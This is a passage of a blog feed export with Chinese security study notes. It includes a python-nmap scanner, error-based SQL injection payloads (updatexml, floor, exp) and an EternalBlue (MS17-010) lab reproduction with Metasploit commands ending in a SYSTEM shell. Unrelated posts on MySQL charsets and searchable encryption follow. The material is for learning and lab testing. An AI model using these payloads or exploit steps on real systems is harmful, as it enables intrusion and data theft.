data-num=\"57\"></td><td><pre>    <span class=\"token comment\"># 把应用部署到 httpserver</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    sever <span class=\"token operator\">=</span> HTTPServer<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    sever<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    sever<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    IOLoop<span class=\"token punctuation\">.</span>current<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"314-我和你之间就差一个-python-nmap\"><a class=\"anchor\" href=\"#314-我和你之间就差一个-python-nmap\">#</a> 3.14 我和你之间就差一个 Python-nmap</h1>\n<p>python-nmap 用的核心方法</p>\n<ul>\n<li>portscanner () 终端扫描的封装</li>\n<li>portscannerhostdict () 扫描完成返回结果集</li>\n</ul>\n<p>实现内网端口扫描工具</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : zhong</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>since        : 2022-08-27 21:41:24</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lastTime     : 2022-08-27 23:45:06</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>blog         : http://dpm12345.cn/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>email        : 1006975692@qq.com</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 准备工作</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># Window nmap.exe</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># Linux</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># python-namp   pip install python-nmap</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 目标实现指定 IP 或 ip 范围的端口扫描</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">import</span> nmap</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>input_data <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input hosts and ports:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>scan_row <span class=\"token operator\">=</span> input_data<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>scan_row<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>hosts <span class=\"token operator\">=</span> scan_row<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>ports <span class=\"token operator\">=</span> scan_row<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 创建一个扫描对象</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    nm <span class=\"token operator\">=</span> nmap<span class=\"token punctuation\">.</span>PortScanner<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nmap not found\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>nm<span class=\"token punctuation\">.</span>scan<span class=\"token punctuation\">(</span>hosts<span class=\"token operator\">=</span>hosts<span class=\"token punctuation\">,</span> arguments<span class=\"token operator\">=</span><span class=\"token string\">' -v -sS -p'</span> <span class=\"token operator\">+</span> ports<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># 遍历扫描的主机</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">for</span> host <span class=\"token keyword\">in</span> nm<span class=\"token punctuation\">.</span>all_hosts<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span> <span class=\"token operator\">*</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Host:{}{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>hostname<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'State:{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出主机状态</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">for</span> proto <span class=\"token keyword\">in</span> nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>all_protocols<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 遍历所有的协议</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"protocol:{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>proto<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token comment\"># 扫描所有端口所对应的状态</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        lport <span class=\"token operator\">=</span> nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>proto<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>kets<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">for</span> port <span class=\"token keyword\">in</span> lport<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"port:{}\\tstate:{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                port<span class=\"token punctuation\">,</span> nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>proto<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>port<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'state'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"315-流量分析实战\"><a class=\"anchor\" href=\"#315-流量分析实战\">#</a> 3.15 流量分析实战</h1>\n<p>wireshark 的基本介绍</p>\n<ul>\n<li>只能查看包，无法拦截修改</li>\n<li>filter 的规则</li>\n<li>功能</li>\n</ul>\n<h1 id=\"316-企业攻防实战\"><a class=\"anchor\" href=\"#316-企业攻防实战\">#</a> 3.16 企业攻防实战</h1>\n<ul>\n<li>\n<p>攻防</p>\n<p>攻击 --&gt; web 渗透 -- 主机 --&gt; 内网渗透</p>\n<p>防护 --&gt; web 安全防护 -- 系统安全防护 -- 安全设备防护等</p>\n</li>\n<li>\n<p>如何做好一个白帽子：要具备黑帽子技术同时具备防护的技术</p>\n</li>\n<li>\n<p>如何做好防护：在攻击前打好漏洞补丁</p>\n<p>web 代码、系统漏洞、中间件的配置、数据库</p>\n</li>\n</ul>\n<p>框架熟知</p>\n<h1 id=\"317-揭秘黑客如何通过木马控制目标服务器-webshell\"><a class=\"anchor\" href=\"#317-揭秘黑客如何通过木马控制目标服务器-webshell\">#</a> 3.17 揭秘黑客如何通过木马控制目标服务器 - webshell</h1>\n<p>udf 提权</p>\n",
            "tags": [
                "信息安全"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e73517db/",
            "url": "http://dpm12345.cn/posts/e73517db/",
            "title": "SQL注入",
            "date_published": "2022-08-28T05:01:48.000Z",
            "content_html": "<h1 id=\"联合查询\"><a href=\"#联合查询\" class=\"headerlink\" title=\"联合查询\"></a>联合查询</h1><h1 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h1><h2 id=\"updatexml\"><a href=\"#updatexml\" class=\"headerlink\" title=\"updatexml\"></a>updatexml</h2><p>example：<code>?id=1'+updatexml(1,concat(0x7e,(select version())),0x7e)%23</code></p>\n<h2 id=\"floor\"><a href=\"#floor\" class=\"headerlink\" title=\"floor\"></a>floor</h2><p><code>floor</code>报错的原理是<code>rand</code>和<code>order by</code>或<code>group by</code>的冲突</p>\n<p>example：</p>\n<ul>\n<li><p>爆破数据库版本信息</p>\n<p><code>?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></p>\n</li>\n<li><p>爆破数据库名信息</p>\n<p><code>?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></p>\n</li>\n</ul>\n<p>分解解释</p>\n<p>分别将各语句分开，最终得到<code>select 1 from a</code>;</p>\n<p>而为了让<code>floor</code>中的<code>rand</code>和<code>order by</code>或<code>group by</code>进行冲突，必须存在<code>floor(rand (0)*2) x group by x</code></p>\n<p>编写步骤:</p>\n<p><code>select 1 from a</code></p>\n<p>丰富<code>a</code>的内容</p>\n<p><code>select 1 from (select count(*),xxx from information_schema.tables group by xxx)a</code></p>\n<p>替换上面的<code>xxx</code></p>\n<p><code>select 1 from (select count(*),concat(aaa,floor(rand(0)*2))xxx from information_schema.tables group by xxx)a</code></p>\n<p>最后替换<code>concat</code>中的<code>aaa</code>(即为需要获得的信息)</p>\n<p><code>select 1 from (select count(*),concat(concat(0x7e,database(),0x7e),floor(rand(0)*2))xxx from information_schema.tables group by xxx)a</code></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>example:<code>?id=1' and exp(~(select * from (select user())x))%23</code></p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/65089f0a/",
            "url": "http://dpm12345.cn/posts/65089f0a/",
            "title": "ms17-010 漏洞复现",
            "date_published": "2022-08-24T05:05:51.000Z",
            "content_html": "<h1 id=\"漏洞介绍\"><a href=\"#漏洞介绍\" class=\"headerlink\" title=\"漏洞介绍\"></a>漏洞介绍</h1><h2 id=\"名称\"><a href=\"#名称\" class=\"headerlink\" title=\"名称\"></a>名称</h2><p>MS17-010，又称永恒之蓝</p>\n<h2 id=\"利用原理\"><a href=\"#利用原理\" class=\"headerlink\" title=\"利用原理\"></a>利用原理</h2><p>永恒之蓝漏洞通过 TCP 的 445 和 139 端口，来利用 SMBv1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放 445 文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。不法分子就能在其电脑或服务器中植入勒索病毒、窃取用户隐私、远程控制木马等恶意程序。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>目前已知受影响的Windows版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><h2 id=\"复现环境\"><a href=\"#复现环境\" class=\"headerlink\" title=\"复现环境\"></a>复现环境</h2><ul>\n<li>攻击机：kali </li>\n<li>目标机：windows_7_professional_with_sp1_x64</li>\n</ul>\n<p>实验条件：双方机子可以相互 ping 通，目标机开启了 445 端口，并且关闭了防火墙</p>\n<p>[注：1. netstat -an 查看端口开启状态，如果未开启，可以采用以下方法]{.red}</p>\n<pre><code class=\"raw\">1、按 “Win+R” 组合键，输入 regedit 打开注册表编辑器；\n\n2、打开 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\NetBT\\Parameters ；\n\n3、在右侧找到 SMBDeviceEnabled，双击将键值更改为 1 ；\n</code></pre>\n<p>[2. 如果端口开启，再检查防火墙是否关闭（之前就因为防火墙没关导致nmap扫描不出)]{.red}</p>\n<p>[3. 如果为了安装 VMware tools 的驱动而安装了 KB4474419 的补丁，那么在开始之前需要将更新卸载掉，不然无法利用该漏洞]{.red}</p>\n<h2 id=\"复现过程\"><a href=\"#复现过程\" class=\"headerlink\" title=\"复现过程\"></a>复现过程</h2><pre><code class=\"bash\">nmap 192.168.47.139  #扫描目标机\n</code></pre>\n<p>返回</p>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_1.jpg\"></p>\n<p>可以看到 445 端口的状态为<code>open</code></p>\n<h3 id=\"使用-msfconsole-的永恒之蓝模块\"><a href=\"#使用-msfconsole-的永恒之蓝模块\" class=\"headerlink\" title=\"使用 msfconsole 的永恒之蓝模块\"></a>使用 msfconsole 的永恒之蓝模块</h3><h3 id=\"搜索使用\"><a href=\"#搜索使用\" class=\"headerlink\" title=\"搜索使用\"></a>搜索使用</h3><pre><code class=\"bash\">search ms17-010\n</code></pre>\n<p>得到</p>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_2.jpg\"></p>\n<p>其中</p>\n<p><code>exploit/windows/smb/ms17_010_eternalblue</code>为攻击模块</p>\n<p><code>auxiliary/scanner/smb/smb_ms17_010</code>为扫描模块</p>\n<h3 id=\"扫描\"><a href=\"#扫描\" class=\"headerlink\" title=\"扫描\"></a>扫描</h3><p>依次执行以下命令</p>\n<pre><code class=\"bash\">use auxiliary/scanner/smb/smb_ms17_010\nset rhosts 192.168.47.139 # rhost 值为目标机 ip\nrun\n</code></pre>\n<p>当返回</p>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_3.jpg\"></p>\n<p>代表该漏洞可以利用，如果返回<code>Host does NOT appear vulnerable.</code>，则检查更新安装情况，尝试卸载</p>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><p>依次执行以下命令</p>\n<pre><code class=\"bash\">use exploit/windows/smb/ms17_010_eternalblue\nset rhosts 192.168.47.139\nrun\n</code></pre>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_4.jpg\"></p>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_5.jpg\"></p>\n<p>可以看到为系统权限</p>\n<p>输入<code>shell</code>，若有乱码，那么再输入<code>chcp 65001</code></p>\n",
            "tags": [
                "ms17",
                "msf"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/ac16a623/",
            "url": "http://dpm12345.cn/posts/ac16a623/",
            "title": "qq_robot",
            "date_published": "2022-08-12T19:26:58.000Z",
            "content_html": "<h1 id=\"sql搜索\"><a href=\"#sql搜索\" class=\"headerlink\" title=\"sql搜索\"></a>sql搜索</h1><p>当报错<code>Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation '='</code></p>\n<p>修改配置文件 (/etc/my.cnf), 添加以下内容</p>\n<pre><code class=\"raw\">[client]\ndefault-character-set=utf8mb4\n\n[mysql]\n设置mysql默认字符集\ndefault-character-set=utf8mb4\n\n[mysqld]\n设置mysql字符集服务器\ncharacter-set-server=utf8mb4\ncollation-server=utf8mb4_unicode_ci\ninit_connect='SET NAMES utf8mb4\n</code></pre>\n<p>在查询emoji表情时，由于unicode排序查找时不区分大小写，因此需要根据二进制进行查询</p>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/b2220af/",
            "url": "http://dpm12345.cn/posts/b2220af/",
            "title": "ESVSSE Enabling Efficient, Secure, Verifiable Searchable Symmetric Encryption",
            "date_published": "2022-08-10T14:54:40.000Z",
            "content_html": "<h1 id=\"esvsse-enabling-efficient-secure-verifiable-searchable-symmetric-encryption\"><a class=\"anchor\" href=\"#esvsse-enabling-efficient-secure-verifiable-searchable-symmetric-encryption\">#</a> ESVSSE Enabling Efficient, Secure, Verifiable Searchable Symmetric Encryption</h1>\n<h2 id=\"problem-statement-问题说明\"><a class=\"anchor\" href=\"#problem-statement-问题说明\">#</a> PROBLEM STATEMENT 问题说明</h2>\n<h2 id=\"overview-of-esvsse\"><a class=\"anchor\" href=\"#overview-of-esvsse\">#</a> OVERVIEW OF ESVSSE</h2>\n<h3 id=\"system-structure-系统结构\"><a class=\"anchor\" href=\"#system-structure-系统结构\">#</a> System Structure 系统结构</h3>\n<p>它由数据拥有者、云服务器和授权用户组成。数据拥有者将加密后的数据存储在云服务器中。授权用户可以对云服务器的数据进行搜索。数据拥有者对云中的数据拥有管理权。</p>\n<p><img data-src=\"./../../../post_images/thesis/ESVSSE_1.png\" alt=\"image-20230813060415141\"></p>\n<h3 id=\"system-model-系统模型\"><a class=\"anchor\" href=\"#system-model-系统模型\">#</a> System Model 系统模型</h3>\n<p>数据拥有者将加密的文档、认证器和使用 B+-Tree 的安全索引上传到云服务器。该方案允许用户验证搜索结果的完整性和新鲜度</p>\n<p>ESVSSE 定义如下：</p>\n<p>ESVSSE 是一个三方模型，数据所有者在云服务器上存储安全索引、身份验证器和加密文档。数据所有者可以授权用户查询云服务器。授权过程与 [20] 类似。云服务器提供存储和搜索功能。授权用户可以发起查询和验证操作。</p>\n<p>ESVSSE 是 7 个多项式时间算法的集合。</p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>e</mi><mi>n</mi><mo stretchy=\"false\">(</mo><msup><mn>1</mn><mi>k</mi></msup><mo stretchy=\"false\">)</mo><mo>→</mo><mo stretchy=\"false\">{</mo><msub><mi>K</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>3</mn></msub><mo separator=\"true\">,</mo><mo stretchy=\"false\">(</mo><mi>s</mi><mi>s</mi><mi>k</mi><mo separator=\"true\">,</mo><mi>s</mi><mi>p</mi><mi>k</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">Gen(1^k)\\rightarrow \\{K_1,K_2,K_3,(ssk,spk)\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.099108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mclose\">)</span><span class=\"mclose\">}</span></span></span></span>: 一个以安全参数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 为输入，输出私钥<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>K</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">K_1,K_2,K_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和一个随机签名密钥对<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>s</mi><mi>s</mi><mi>k</mi><mo separator=\"true\">,</mo><mi>s</mi><mi>p</mi><mi>k</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">( ssk , spk)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" 